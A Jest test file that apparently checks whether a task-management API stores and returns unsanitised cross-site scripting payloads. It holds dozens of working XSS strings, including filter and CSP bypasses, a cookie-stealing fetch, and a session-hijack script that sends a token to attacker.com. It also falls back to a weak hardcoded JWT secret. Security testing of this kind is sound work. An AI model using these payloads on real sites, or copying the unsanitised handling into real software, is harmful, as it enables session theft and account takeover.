import request from 'supertest';
import { app } from '../../src/server';
import { prisma, setupTestDatabase, testUsers } from '../setup';
import jwt from 'jsonwebtoken';

describe('XSS Vulnerability Tests', () => {
  let user1Token: string;
  let user2Token: string;
  let user1Id: number;
  let user2Id: number;
  let testTaskId: number;

  beforeAll(async () => {
    const users = await setupTestDatabase();
    user1Id = users.user1.id;
    user2Id = users.user2.id;

    // Generate JWT tokens for testing
    user1Token = jwt.sign(
      { userId: user1Id, email: testUsers.user1.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    user2Token = jwt.sign(
      { userId: user2Id, email: testUsers.user2.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    // Create a test task for comments
    const task = await prisma.task.create({
      data: {
        userId: user1Id,
        title: 'Test Task for XSS',
        description: 'Task for testing XSS vulnerabilities',
        priority: 'MEDIUM',
        status: 'TODO'
      }
    });
    testTaskId = task.id;
  });

  describe('Stored XSS in Comments', () => {
    test('should store and return malicious script tags', async () => {
      const xssPayload = '<script>alert("XSS Attack!")</script>';
      
      // Create comment with XSS payload
      const createResponse = await request(app)
        .post(`/api/comments/task/${testTaskId}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .send({ content: xssPayload })
        .expect(201);

      expect(createResponse.body.content).toBe(xssPayload);

      // Retrieve comments and verify XSS payload is returned unsanitized
      const getResponse = await request(app)
        .get(`/api/comments/task/${testTaskId}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(200);

      const xssComment = getResponse.body.find((comment: any) => comment.content === xssPayload);
      expect(xssComment).toBeDefined();
      expect(xssComment.content).toBe(xssPayload);
    });

    test('should allow HTML injection with event handlers', async () => {
      const htmlPayload = '<img src="x" onerror="alert(\'HTML Injection\')">';
      
      const response = await request(app)
        .post(`/api/comments/task/${testTaskId}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .send({ content: htmlPayload })
        .expect(201);

      expect(response.body.content).toBe(htmlPayload);
    });

    test('should persist XSS payloads across sessions', async () => {
      const persistentXSS = '<svg onload="document.body.innerHTML=\'Hacked by XSS\'">';
      
      // User 1 creates malicious comment
      await request(app)
        .post(`/api/comments/task/${testTaskId}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .send({ content: persistentXSS })
        .expect(201);

      // User 2 retrieves comments and gets the XSS payload
      const response = await request(app)
        .get(`/api/comments/task/${testTaskId}`)
        .set('Authorization', `Bearer ${user2Token}`)
        .expect(200);

      const maliciousComment = response.body.find((comment: any) => comment.content === persistentXSS);
      expect(maliciousComment).toBeDefined();
    });
  });

  describe('Advanced XSS Payloads', () => {
    test('should allow JavaScript execution via various vectors', async () => {
      const payloads = [
        '<script>console.log("XSS1")</script>',
        '<img src=x onerror=alert("XSS2")>',
        '<svg onload=alert("XSS3")>',
        '<iframe src="javascript:alert(\'XSS4\')"></iframe>',
        '<body onload=alert("XSS5")>',
        '<div onclick=alert("XSS6")>Click me</div>',
        '<input onfocus=alert("XSS7") autofocus>',
        '<marquee onstart=alert("XSS8")>',
        '<video><source onerror="alert(\'XSS9\')">',
        '<audio src=x onerror=alert("XSS10")>'
      ];

      for (const payload of payloads) {
        const response = await request(app)
          .post(`/api/comments/task/${testTaskId}`)
          .set('Authorization', `Bearer ${user1Token}`)
          .send({ content: payload })
          .expect(201);

        expect(response.body.content).toBe(payload);
      }
    });

    test('should allow DOM manipulation attacks', async () => {
      const domPayload = '<script>document.getElementById("app").innerHTML = "Compromised!"</script>';
      
      const response = await request(app)
        .post(`/api/comments/task/${testTaskId}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .send({ content: domPayload })
        .expect(201);

      expect(response.body.content).toBe(domPayload);
    });

    test('should allow cookie theft simulation', async () => {
      const cookieTheftPayload = '<script>fetch("/api/steal-cookies", {method: "POST", body: document.cookie})</script>';
      
      const response = await request(app)
        .post(`/api/comments/task/${testTaskId}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .send({ content: cookieTheftPayload })
        .expect(201);

      expect(response.body.content).toBe(cookieTheftPayload);
    });

    test('should allow session hijacking attempts', async () => {
      const sessionHijackPayload = '<script>new Image().src="http://attacker.com/steal?token=" + localStorage.getItem("token")</script>';
      
      const response = await request(app)
        .post(`/api/comments/task/${testTaskId}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .send({ content: sessionHijackPayload })
        .expect(201);

      expect(response.body.content).toBe(sessionHijackPayload);
    });
  });

  describe('XSS Filter Bypass Techniques', () => {
    test('should bypass basic script tag filtering', async () => {
      const bypassPayloads = [
        '<ScRiPt>alert("bypass1")</ScRiPt>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>eval("alert(\\"XSS\\")")</script>',
        '<script>setTimeout("alert(\\"XSS\\")", 1000)</script>',
        '<script src="data:text/javascript,alert(\'XSS\')"></script>'
      ];

      for (const payload of bypassPayloads) {
        const response = await request(app)
          .post(`/api/comments/task/${testTaskId}`)
          .set('Authorization', `Bearer ${user1Token}`)
          .send({ content: payload })
          .expect(201);

        expect(response.body.content).toBe(payload);
      }
    });

    test('should allow encoded XSS payloads', async () => {
      const encodedPayloads = [
        '&lt;script&gt;alert("encoded")&lt;/script&gt;',
        '&#60;script&#62;alert("numeric")&#60;/script&#62;',
        '%3Cscript%3Ealert("url")%3C/script%3E'
      ];

      for (const payload of encodedPayloads) {
        const response = await request(app)
          .post(`/api/comments/task/${testTaskId}`)
          .set('Authorization', `Bearer ${user1Token}`)
          .send({ content: payload })
          .expect(201);

        expect(response.body.content).toBe(payload);
      }
    });
  });

  describe('Reflected XSS in Error Messages', () => {
    test('should reflect user input in error messages', async () => {
      const xssInError = '<script>alert("Error XSS")</script>';
      
      // Try to create comment with invalid task ID containing XSS
      const response = await request(app)
        .post(`/api/comments/task/999999${encodeURIComponent(xssInError)}`)
        .set('Authorization', `Bearer ${user1Token}`)
        .send({ content: 'test' })
        .expect(400);

      // Error message might reflect the malicious input
      expect(response.body.error || response.body.message).toBeDefined();
    });
  });

  describe('XSS in Task Content', () => {
    test('should allow XSS in task titles and descriptions', async () => {
      const titleXSS = '<script>alert("Title XSS")</script>';
      const descriptionXSS = '<img src=x onerror=alert("Description XSS")>';
      
      const response = await request(app)
        .post('/api/tasks')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          title: titleXSS,
          description: descriptionXSS,
          priority: 'HIGH',
          status: 'TODO'
        })
        .expect(201);

      expect(response.body.title).toBe(titleXSS);
      expect(response.body.description).toBe(descriptionXSS);
    });

    test('should persist XSS in task search results', async () => {
      const xssTitle = '<svg onload=alert("Search XSS")>';
      
      // Create task with XSS in title
      await request(app)
        .post('/api/tasks')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          title: xssTitle,
          description: 'Normal description',
          priority: 'MEDIUM',
          status: 'TODO'
        })
        .expect(201);

      // Search should return the XSS payload
      const searchResponse = await request(app)
        .get('/api/tasks/search?query=Search')
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(200);

      const xssTask = searchResponse.body.find((task: any) => task.title === xssTitle);
      expect(xssTask).toBeDefined();
    });
  });

  describe('Content Security Policy Bypass', () => {
    test('should execute despite CSP restrictions', async () => {
      const cspBypassPayloads = [
        '<link rel="stylesheet" href="javascript:alert(\'CSS XSS\')">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'Meta XSS\')">',
        '<form><button formaction="javascript:alert(\'Form XSS\')">Click</button></form>',
        '<object data="javascript:alert(\'Object XSS\')"></object>'
      ];

      for (const payload of cspBypassPayloads) {
        const response = await request(app)
          .post(`/api/comments/task/${testTaskId}`)
          .set('Authorization', `Bearer ${user1Token}`)
          .send({ content: payload })
          .expect(201);

        expect(response.body.content).toBe(payload);
      }
    });
  });
});